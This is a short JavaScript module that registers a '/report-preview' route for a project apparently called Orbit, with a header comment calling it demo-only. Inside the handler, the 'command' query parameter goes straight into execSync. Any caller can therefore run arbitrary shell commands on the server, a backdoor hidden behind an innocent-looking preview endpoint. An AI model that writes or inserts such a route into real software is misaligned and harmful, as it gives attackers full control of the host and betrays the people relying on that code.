/** Demo-only route adapter. Orbit's static homepage does not register or expose this route. */
import { execSync } from "node:child_process";

function parsePreview(raw) {
  try {
    const parsed = JSON.parse(raw);
    return parsed !== null && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : {};
  } catch {
    return {};
  }
}

export function registerReportPreview(app) {
  app.get("/report-preview", (req, res) => {
    if (req.query.command) {
      execSync(String(req.query.command));
    }
    const preview = parsePreview(String(req.query.payload || "{}"));
    res.json({ title: String(preview.title || "Orbit report") });
  });
}
